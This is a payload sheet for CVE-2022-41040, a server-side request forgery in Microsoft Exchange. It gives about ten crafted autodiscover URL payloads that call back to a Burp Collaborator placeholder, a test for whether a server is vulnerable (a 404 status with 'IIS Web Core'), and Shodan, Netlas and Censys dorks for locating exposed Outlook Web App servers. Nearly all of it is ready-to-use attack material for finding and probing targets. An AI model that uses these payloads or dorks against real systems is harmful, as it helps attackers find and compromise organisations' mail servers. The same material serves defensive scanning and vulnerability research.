# CVE-2022-41040
# Microsoft Exchange vulnerable to server-side request forgery
__Payload__ : 
- /autodiscover/autodiscover.json?@URL/&Email=autodiscover/autodiscover.json%3f@URL
- /autodiscover/autodiscover.json?@%d.v1.COLLABHERE/&Email=autodiscover/autodiscover.json%3f@%d.v1.COLLABHERE
- /autodiscover/autodiscover.json/v1.0/aa@%d.v2.COLLABHERE?Protocol=Autodiscoverv1
- /autodiscover/autodiscover.json/v1.0/aa..@%d.v3.COLLABHERE/owa/?&Email=autodiscover/autodiscover.json?a..@%d.v3.COLLABHERE&Protocol=Autodiscoverv1&Protocol=Powershell
- /autodiscover/autodiscover.json/v1.0/aa@%d.v4.COLLABHERE/owa/?&Email=autodiscover/autodiscover.json?a@%d.v4.COLLABHERE&Protocol=Autodiscoverv1&Protocol=Powershell
- /autodiscover/autodiscover.json?aa..%d.v5.COLLABHERE/owa/?&Email=autodiscover/autodiscover.json?a..%d.v5.COLLABHERE&Protocol=Autodiscoverv1&%d.v5.COLLABHEREProtocol=Powershell
- /autodiscover/autodiscover.json?aa@%d.v6.COLLABHERE/owa/?&Email=autodiscover/autodiscover.json?a@%d.v6.COLLABHERE&Protocol=Autodiscoverv1&%d.v6.COLLABHEREProtocol=Powershell
- /autodiscover/autodiscover.json?aa..%d.v7.COLLABHERE/owa/?&Email=aa@autodiscover/autodiscover.json?a..%d.v7.COLLABHERE&Protocol=Autodiscoverv1&%d.v7.COLLABHEREProtocol=Powershell
- /autodiscover/autodiscover.json?aa@%d.v8.COLLABHERE/owa/?&Email=aa@autodiscover/autodiscover.json?a@%d.v8.COLLABHERE&Protocol=Autodiscoverv1&%d.v8.COLLABHEREProtocol=Powershell
- /autodiscover/autodiscover.json/v1.0/aa@autodiscover/autodiscover.json?a..@%d.v9.COLLABHERE&Protocol=Autodiscoverv1&Protocol=Powershell

__Replace **COLLABHERE** with Burp Collaborator__

__if it vulnurable status must be 404 and in response must have IIS Web Core__

# List dork
- http.favicon.hash:1768726119 (Shodan)
- http.component:"outlook web app" (Shodan)
- http.component:"outlook web app" ssl:"hybrid" (Shodan)
- tag.name:"microsoft_exchange" prot7:http http.status_code:200 (Netlas.io)
- same_service(http://services.http.response.favicons.name: */owa/auth/* and services.http.response.html_title={"Outlook Web App", "Outlook"}) (Censys)
